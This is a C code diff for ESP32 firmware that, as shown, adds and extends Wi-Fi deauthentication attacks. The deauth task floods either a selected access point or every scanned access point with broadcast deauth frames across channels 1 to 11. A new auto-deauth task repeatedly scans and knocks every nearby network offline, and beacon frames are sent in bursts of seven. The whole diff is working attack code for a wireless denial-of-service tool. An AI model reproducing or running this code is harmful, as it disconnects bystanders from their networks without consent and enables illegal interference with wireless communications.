@@ -334,7 +334,7 @@ void wifi_manager_start_scan() {
         .ssid = NULL,
         .bssid = NULL,
         .channel = 0,
-        .show_hidden = true
+        .show_hidden = false
     };
 
     
@@ -457,23 +457,25 @@ void wifi_deauth_task(void *param) {
     }
 
     while (1) {
-        // if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL // TODO Figure out why deauth dosent work on selected ap
-        // {
-        //     for (int y = 1; y < 12; y++)
-        //     {
-        //         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-        //         wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
-        //         vTaskDelay(10 / portTICK_PERIOD_MS);
-        //     }
-        // }
-
-        for (int i = 0; i < ap_count; i++)
+        if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL // TODO Figure out why deauth dosent work on selected ap
         {
             for (int y = 1; y < 12; y++)
             {
                 uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);
+                wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
+                vTaskDelay(10 / portTICK_PERIOD_MS);
+            }
+        }
+        else 
+        {
+            for (int i = 0; i < ap_count; i++)
+            {
+                for (int y = 1; y < 12; y++)
+                {
+                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
+                    vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);
+                }
             }
         }
     }
@@ -484,6 +486,7 @@ void wifi_manager_start_deauth()
 {
     if (!beacon_task_running) {
         ESP_LOGI(TAG, "Starting deauth transmission...");
+        esp_wifi_start();
         xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, 0, 255, 22, 23, false);
@@ -524,6 +527,71 @@ void wifi_manager_select_ap(int index)
              selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
 
     printf("Selected Access Point Successfully\n");
+}
+
+
+void wifi_auto_deauth_task(void* Parameter)
+{
+    while (1)
+    {
+
+        wifi_scan_config_t scan_config = {
+            .ssid = NULL,
+            .bssid = NULL,
+            .channel = 0,
+            .show_hidden = true
+        };
+
+        ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, false));
+
+
+        vTaskDelay(pdMS_TO_TICKS(3000));
+
+        esp_wifi_scan_stop();
+
+        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
+
+        if (ap_count > 0) {
+            scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
+            if (scanned_aps == NULL) {
+                ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+                return;
+            }
+
+            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
+
+            ESP_LOGI(TAG, "Found %d access points", ap_count);
+        } else {
+            ESP_LOGI(TAG, "No access points found");
+        }
+
+        wifi_ap_record_t *ap_info = scanned_aps;
+        if (ap_info == NULL) {
+            ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+            return;
+        }
+
+        for (int z = 0; z < 50; z++)
+        {
+            for (int i = 0; i < ap_count; i++)
+            {
+                for (int y = 1; y < 12; y++)
+                {
+                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
+                    vTaskDelay(50 / portTICK_PERIOD_MS);
+                }
+            }
+        }
+
+        free(scanned_aps);
+    }   
+}
+
+void wifi_manager_auto_deauth()
+{
+    ESP_LOGI(TAG, "Starting auto deauth transmission...");
+    wifi_auto_deauth_task(NULL);
 }
 
 
@@ -653,6 +721,12 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
     size_t packet_size = (38 + ssid_len + 12 + 3 + 9);
 
     
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
     if (err != ESP_OK) {
         ESP_LOGE(TAG, "Failed to send beacon frame: %s", esp_err_to_name(err));
